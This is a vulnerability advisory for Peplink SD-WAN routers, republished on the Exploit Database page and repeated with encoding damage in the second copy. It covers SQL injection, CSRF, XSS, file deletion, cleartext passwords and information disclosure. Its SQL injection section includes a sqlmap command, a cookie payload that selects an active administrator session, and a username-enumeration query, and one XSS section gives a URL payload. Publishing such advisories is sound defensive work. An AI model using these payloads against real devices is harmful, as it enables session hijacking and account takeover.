Status: Public
Advisory-URL: https://www.x41-dsec.de/lab/advisories/x41-2017-005-peplink/

Summary and Impact
------------------
Several issues have been identified, which allow attackers to access the
administrative web interface with admin credentials, delete files,
perform CSRF and XSS attacks.

Product Description
-------------------
From the vendor webpage:
Use Load Balancing and SpeedFusion bandwidth bonding to deliver
superfast VoIP, video streaming, and data using an SD-WAN enabled
network. Even with a basic Balance 20 dual-WAN router, you can mix
different transport technologies and providers to keep your network up
when individual links go down. Switching between links is automatic and
seamless.

SQL Injection via bauth Cookie
==============================
Severity Rating: Critical
Vector: Network
CVE: CVE-2017-8835
CWE: 89
CVSS Score: 9.8
CVSS Vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

Summary and Impact
------------------
Peplink devices are vulnerable to an SQL injection attack via the bauth
cookie parameter which is set e.g. when accessing
https://ip/cgi-bin/MANGA/admin.cgi.

The injection can be checked with the following command:

./sqlmap.py -u "https://ip/cgi-bin/MANGA/admin.cgi"
--cookie="bauth=csOWLxU4BvoMfhY2rHLVFm1EmZWV74zinla9IVclqrYxH16426647"
-p"bauth" --level 5 --risk 3 --dbms sqlite --technique=BEUSQ
--flush-session -t trace.log --prefix "'" --suffix "--" -a

The vulnerability in the Peplink device allows to access the SQLite
session database containing user and session variables. By using the the
following cookie in a web request, it is possible to select a running
administrator session to be used for the attackers login.

bauth=-12' or id IN (select s.id from sessions as s left join
sessionsvariables as v on v.id=s.id where v.name='rwa' and v.value='1')
or '1'='2

By forming specialised SQL queries, it is possible to retrieve usernames
from the database. This worked by returning a valid session in case the
username existed and no session if it did not exist. In the first case
the server did not set a new session cookie in the response to the request.

SELECT id FROM sessions WHERE sessionid = '-14' or id IN (select s.id
from sessions as s left join sessionsvariables as v on v.id=s.id where
v.name='username' and substr(v.value,1,3)='adm')

Workarounds
-----------
Install vendor supplied update.

No CSRF Protection
==================
Severity Rating: Medium
Vector: Network
CVE: CVE-2017-8836
CWE: 352
CVSS Score: 5.4
CVSS Vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N

Summary and Impact
------------------
The CGI scripts in the administrative interface are not protected
against cross site request forgery attacks. This allows an attacker to
execute commands, if a logged in user visits a malicious website. This
can for example be used to change the credentials of the administrative
webinterface.

Workarounds
-----------
Install vendor supplied update.

Passwords stored in Cleartext
=============================
Severity Rating: Medium
Vector: Network
CVE: CVE-2017-8837
CWE: 256
CVSS Score: 4.0
CVSS Vector: CVSS:3.0/AV:L/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N

Summary and Impact
------------------
The Peplink devices store passwords in cleartext in the files
/etc/waipass and /etc/roapass. In case one of these devices is
compromised the attacker can gain access to the cleartext passwords and
abuse them to compromise further systems.

Workarounds
-----------
Install vendor supplied update.

XSS via syncid Parameter
========================
Severity Rating: Medium
Vector: Network
CVE: CVE-2017-8838
CWE: 80
CVSS Score: 5.4
CVSS Vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N

Summary and Impact
------------------
If the webinterface is accessible, it is possible to abuse the syncid
parameter to trigger a cross-site-scripting issue by calling
https://ip/cgi-bin/HASync/hasync.cgi?debug=1&syncid=123%3Cscript%3Ealert%281%29%3C/script%3E

This executes the JavaScript in the victims browser, which can be abused
to steal session cookies.

Workarounds
-----------
Install vendor supplied update.

XSS via preview.cgi
===================
Severity Rating: Medium
Vector: Network
CVE: CVE-2017-8839
CWE: 80
CVSS Score: 5.4
CVSS Vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N

Summary and Impact
------------------
If the webinterface is accessible, it is possible to abuse the the
orig_url parameter to trigger a cross-site-scripting issue in
/guest/preview.cgi. The injection is directly into existing JavaScript.

This executes the JavaScript in the victims browser, which can be abused
to steal session cookies.

Workarounds
-----------
Install vendor supplied update.

File Deletion
=============
Severity Rating: Medium
Vector: Network
CVE: CVE-2017-8841
CWE: 73
CVSS Score: 6.5
CVSS Vector: CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:H/A:H

Summary and Impact
------------------
A logged in user can delete arbitrary files on the Peplink devices, by
abusing the /cgi-bin/MANGA/firmware_process.cgi. When an absolute path
is provided to the upfile.path parameter the file provided in the path
is deleted during the process. This can be abused to cause a denial of
service (DoS). In combination with the missing CSRF protection, this can
be abused remotely via a logged in user.

Workarounds
-----------
Install vendor supplied update.

Information Disclosure
======================
Severity Rating: Medium
Vector: Network
CVE: CVE-2017-8840
CWE: 200
CVSS Score: 5.3
CVSS Vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N

Summary and Impact
------------------
If the webinterface is accessible, it is possible to retrieve sensitive
information without a valid login by opening
cgi-bin/HASync/hasync.cgi?debug=1

This displays the following:

-----8<------------------------------------------------
Master LAN Address    = [ <internal ip> / <netmask> ]
Serial Number         = [ <serial number> ]
HA Group ID           = [ <group id> ]
Virtual IP            = [ <internal ip> / <netmask> ]
Submitted syncid      = [ <syncid> ]
-----8<------------------------------------------------

This information can be valuable for an attacker to exploit other issues.

Workarounds
-----------
Install vendor supplied update.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

**Credit:** X41 D-Sec GmbH, Eric Sesterhenn

**Additional Credits:** Claus Overbeck (Abovo IT)

**Status:** Public

**Advisory-URL:** https://www.x41-dsec.de/lab/advisories/x41-2017-005-peplink/

## Summary and Impact

Several issues have been identified, which allow attackers to access the administrative web interface with admin credentials, delete files, perform CSRF and XSS attacks.

## Product Description

From the vendor webpage:

Use Load Balancing and SpeedFusion bandwidth bonding to deliver superfast VoIP, video streaming, and data using an SD-WAN enabled network. Even with a basic Balance 20 dual-WAN router, you can mix different transport technologies and providers to keep your network up when individual links go down. Switching between links is automatic and seamless.

# SQL Injection via bauth Cookie

**Severity Rating:** Critical

**Vector:** Network

**CVE:** CVE-2017-8835

**CWE:** 89

**CVSS Score:** 9.8

**CVSS Vector:** CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

## Summary and Impact

Peplink devices are vulnerable to an SQL injection attack via the bauth cookie parameter which is set e.g. when accessing https://ip/cgi-bin/MANGA/admin.cgi.

The injection can be checked with the following command:

./sqlmap.py -u âhttps://ip/cgi-bin/MANGA/admin.cgiâ âcookie=âbauth=csOWLxU4BvoMfhY2rHLVFm1EmZWV74zinla9IVclqrYxH16426647â -pâbauthâ âlevel 5 ârisk 3 âdbms sqlite âtechnique=BEUSQ âflush-session -t trace.log âprefix âââ âsuffix âââ -a

The vulnerability in the Peplink device allows to access the SQLite session database containing user and session variables. By using the the following cookie in a web request, it is possible to select a running administrator session to be used for the attackers login.

bauth=-12â or id IN (select s.id from sessions as s left join sessionsvariables as v on v.id=s.id where v.name=ârwaâ and v.value=â1â) or â1â=â2

By forming specialised SQL queries, it is possible to retrieve usernames from the database. This worked by returning a valid session in case the username existed and no session if it did not exist. In the first case the server did not set a new session cookie in the response to the request.

SELECT id FROM sessions WHERE sessionid = â-14â or id IN (select s.id from sessions as s left join sessionsvariables as v on v.id=s.id where v.name=âusernameâ and substr(v.value,1,3)=âadmâ)

## Workarounds

Install vendor supplied update.

# No CSRF Protection

**Severity Rating:** Medium

**Vector:** Network

**CVE:** CVE-2017-8836

**CWE:** 352

**CVSS Score:** 5.4

**CVSS Vector:** CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N

## Summary and Impact

The CGI scripts in the administrative interface are not protected against cross site request forgery attacks. This allows an attacker to execute commands, if a logged in user visits a malicious website. This can for example be used to change the credentials of the administrative webinterface.

## Workarounds

Install vendor supplied update.

# Passwords stored in Cleartext

**Severity Rating:** Medium

**Vector:** Network

**CVE:** CVE-2017-8837

**CWE:** 256

**CVSS Score:** 4.0

**CVSS Vector:** CVSS:3.0/AV:L/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N

## Summary and Impact

The Peplink devices store passwords in cleartext in the files /etc/waipass and /etc/roapass. In case one of these devices is compromised the attacker can gain access to the cleartext passwords and abuse them to compromise further systems.

## Workarounds

Install vendor supplied update.

# XSS via syncid Parameter

**Severity Rating:** Medium

**Vector:** Network

**CVE:** CVE-2017-8838

**CWE:** 80

**CVSS Score:** 5.4

**CVSS Vector:** CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N

## Summary and Impact

If the webinterface is accessible, it is possible to abuse the syncid parameter to trigger a cross-site-scripting issue by calling https://ip/cgi-bin/HASync/hasync.cgi?debug=1&syncid=123%3Cscript%3Ealert%281%29%3C/script%3E

This executes the JavaScript in the victims browser, which can be abused to steal session cookies.

## Workarounds

Install vendor supplied update.

# XSS via preview.cgi

**Severity Rating:** Medium

**Vector:** Network

**CVE:** CVE-2017-8839

**CWE:** 80

**CVSS Score:** 5.4

**CVSS Vector:** CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N

## Summary and Impact

If the webinterface is accessible, it is possible to abuse the the orig\_url parameter to trigger a cross-site-scripting issue in /guest/preview.cgi. The injection is directly into existing JavaScript.

This executes the JavaScript in the victims browser, which can be abused to steal session cookies.

## Workarounds

Install vendor supplied update.

# File Deletion

**Severity Rating:** Medium

**Vector:** Network

**CVE:** CVE-2017-8841

**CWE:** 73

**CVSS Score:** 6.5

**CVSS Vector:** CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:H/A:H

## Summary and Impact

A logged in user can delete arbitrary files on the Peplink devices, by abusing the /cgi-bin/MANGA/firmware\_process.cgi. When an absolute path is provided to the upfile.path parameter the file provided in the path is deleted during the process. This can be abused to cause a denial of service (DoS). In combination with the missing CSRF protection, this can be abused remotely via a logged in user.

## Workarounds

Install vendor supplied update.

# Information Disclosure

**Severity Rating:** Medium

**Vector:** Network

**CVE:** CVE-2017-8840

**CWE:** 200

**CVSS Score:** 5.3

**CVSS Vector:** CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N

## Summary and Impact

If the webinterface is accessible, it is possible to retrieve sensitive information without a valid login by opening cgi-bin/HASync/hasync.cgi?debug=1

This displays the following:

```
-----8<------------------------------------------------
Master LAN Address    = [ <internal ip> / <netmask> ]
Serial Number         = [ <serial number> ]
HA Group ID           = [ <group id> ]
Virtual IP            = [ <internal ip> / <netmask> ]
Submitted syncid      = [ <syncid> ]
-----8<------------------------------------------------

```

This information can be valuable for an attacker to exploit other issues.

## Workarounds

Install vendor supplied update.

Summary and Impact
------------------
Peplink devices are vulnerable to an SQL injection attack via the bauth
cookie parameter which is set e.g. when accessing
<https://ip/cgi-bin/MANGA/admin.cgi>.

The injection can be checked with the following command:

./sqlmap.py -u "[https://ip/cgi-bin/MANGA/admin.cgi"](https://ip/cgi-bin/MANGA/admin.cgi%22);
--cookie="bauth=csOWLxU4BvoMfhY2rHLVFm1EmZWV74zinla9IVclqrYxH16426647"
-p"bauth" --level 5 --risk 3 --dbms sqlite --technique=BEUSQ
--flush-session -t trace.log --prefix "'" --suffix "--" -a

The vulnerability in the Peplink device allows to access the SQLite
session database containing user and session variables. By using the the
following cookie in a web request, it is possible to select a running
administrator session to be used for the attackers login.

bauth=-12' or id IN (select s.id from sessions as s left join
sessionsvariables as v on v.id=s.id where v.name='rwa' and v.value='1')
or '1'='2

By forming specialised SQL queries, it is possible to retrieve usernames
from the database. This worked by returning a valid session in case the
username existed and no session if it did not exist. In the first case
the server did not set a new session cookie in the response to the request.

SELECT id FROM sessions WHERE sessionid = '-14' or id IN (select s.id
from sessions as s left join sessionsvariables as v on v.id=s.id where
v.name='username' and substr(v.value,1,3)='adm')
